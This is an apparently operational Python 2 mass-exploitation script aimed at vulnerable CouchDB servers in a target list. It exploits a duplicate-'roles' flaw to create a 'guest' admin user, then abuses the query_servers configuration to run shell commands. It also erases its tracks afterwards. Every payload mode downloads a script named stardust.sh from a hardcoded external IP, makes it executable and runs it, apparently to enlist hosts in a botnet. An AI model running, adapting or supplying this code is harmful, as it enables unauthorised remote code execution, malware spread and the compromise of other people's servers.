
#!/usr/bin/env python
from requests.auth import HTTPBasicAuth
import random
import requests
import re
import sys
from threading import Thread
from time import sleep

if len(sys.argv) < 2:
    print "Usage: python " + sys.argv[0] + " <target_list> [options]"
    print "Options:"
    print "  -r  : Reverse shell mode"
    print "  -c  : Command execution mode"
    print "  -w  : Wget download mode"
    print "  -x  : Extended payload mode"
    sys.exit()

ips = open(sys.argv[1], "r").readlines()
Rdatabases = ["/a564r6fusmg","/dyejdffyjdxryj","/esreghsrgfbgrsb","/sfafdbsrdgjqef","/fyukddyuodyj","/yfjdued6yjdsza","/wefrhnwgerhgsrh","/sfdrebwbef","/fdfgffrgfdsg"]

success = 0
failed = 0
processed = 0

def getVersion(ip):
    try:
        version = requests.get(ip, timeout=5).json()["version"]
        return version
    except:
        return None
 
def exploit(ip):
    global Rdatabases, success, failed, processed
    try:
        # Определяем payload в зависимости от опций
        if len(sys.argv) >= 3:
            if sys.argv[2] == "-r":
                cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.200.81.239/hiddenbin/stardust.sh -O stardust.sh; chmod 777 stardust.sh; sh stardust.sh couchdb.reverse"
            elif sys.argv[2] == "-c":
                cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.200.81.239/hiddenbin/stardust.sh -O stardust.sh; chmod 777 stardust.sh; sh stardust.sh couchdb.command"
            elif sys.argv[2] == "-w":
                cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://84.200.81.239/hiddenbin/stardust.sh -O stardust.sh; chmod 777 stardust.sh; sh stardust.sh couchdb.wget"
            elif sys.argv[2] == "-x":
                cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -o stardust.sh http://84.200.81.239/hiddenbin/stardust.sh; chmod 777 stardust.sh; sh stardust.sh couchdb.extended"
            else:
                cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.200.81.239/hiddenbin/stardust.sh -O stardust.sh; chmod 777 stardust.sh; sh stardust.sh couchdb"
        else:
            cmd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.200.81.239/hiddenbin/stardust.sh -O stardust.sh; chmod 777 stardust.sh; sh stardust.sh couchdb"
        
        db_ = random.choice(Rdatabases)
        db = db_
        ip = ip.rstrip("\n")
        original_ip = ip
        ip = "http://" + ip + ":5984"
        
        version = getVersion(ip)
        if not version:
            failed += 1
            processed += 1
            return
            
        vv = version.replace(".", "")
        v = int(version[0])
        
        # Проверяем уязвимые версии
        if v == 1 and int(vv) <= 170:
            version_num = 1
        elif v == 2 and int(vv) < 211:
            version_num = 2
        else:
            failed += 1
            processed += 1
            return
        
        with requests.session() as session:
            session.headers = {"Content-Type": "application/json"}
            session.timeout = 10
    
            try:
                # Создаем админского пользователя
                payload = '{"type": "user", "name": "'
                payload += "guest"
                payload += '", "roles": ["_admin"], "roles": [],'
                payload += '"password": "guest"}'

                pr = session.put(ip + "/_users/org.couchdb.user:guest", data=payload)
            except:
                failed += 1
                processed += 1
                return
                
            session.auth = HTTPBasicAuth("guest", "guest")
            
            try:
                # Инжектим payload
                if version_num == 1:
                    session.put(ip + "/_config/query_servers/cmd", data='"' + cmd + '"')
                else:
                    try:
                        host = session.get(ip + "/_membership").json()["all_nodes"][0]
                        session.put(ip + "/_node/" + host + "/_config/query_servers/cmd", data='"' + cmd + '"')
                    except:
                        # Fallback для CouchDB 2.x
                        session.put(ip + "/_node/_local/_config/query_servers/cmd", data='"' + cmd + '"')
            except:
                failed += 1
                processed += 1
                return
    
            try:
                # Создаем временную базу данных
                session.put(ip + db)
                session.put(ip + db + "/zero", data='{"_id": "HTP"}')
            except:
                pass
    
            # Выполняем payload
            try:
                if version_num == 1:
                    session.post(ip + db + "/_temp_view?limit=10", data='{"language": "cmd", "map": ""}')
                else:
                    session.post(ip + db + "/_design/zero", data='{"_id": "_design/zero", "views": {"god": {"map": ""} }, "language": "cmd"}')
                
                print "[+] Payload sent to: " + original_ip + " (CouchDB " + version + ")"
                success += 1
                
            except:
                failed += 1
                processed += 1
                return

            # Cleanup
            try:
                session.delete(ip + db)
                if version_num == 1:
                    session.delete(ip + "/_config/query_servers/cmd")
                else:
                    try:
                        host = session.get(ip + "/_membership").json()["all_nodes"][0]
                        session.delete(ip + "/_node/" + host + "/_config/query_servers/cmd")
                    except:
                        session.delete(ip + "/_node/_local/_config/query_servers/cmd")
            except:
                pass
                
        processed += 1
        
    except Exception as e:
        failed += 1
        processed += 1

def status_monitor():
    while True:
        try:
            sys.stdout.write("\r\033[33m[*] Processed: \033[92m[\033[93m" + str(processed) + "\033[92m]\033[33m | Success: \033[92m[\033[93m" + str(success) + "\033[92m]\033[33m | Failed: \033[91m[\033[93m" + str(failed) + "\033[91m]\033[0m")
            sys.stdout.flush()
            sleep(1)
        except KeyboardInterrupt:
            print "\n[!] Exiting on user input..."
            sys.exit(0)

print "[*] Starting CouchDB exploit with stardust.sh payload..."
print "[*] Target file: " + sys.argv[1]
print "[*] Total targets: " + str(len(ips))
print "[*] Payload URL: http://84.200.81.239/hiddenbin/stardust.sh"

# Запускаем монитор статуса
status_thread = Thread(target=status_monitor)
status_thread.daemon = True
status_thread.start()

threads = []
for ip in ips:
    try:
        ip = ip.strip()
        if ip:
            hoho = Thread(target=exploit, args=(ip,))
            hoho.start()
            threads.append(hoho)
            sleep(0.05)  # Небольшая задержка между запусками
    except:
        pass

# Ждем завершения всех потоков
for t in threads:
    t.join()

print "\n\n[*] CouchDB exploitation completed!"
print "[*] Total processed: " + str(processed)
print "[*] Successful: " + str(success)
print "[*] Failed: " + str(failed)
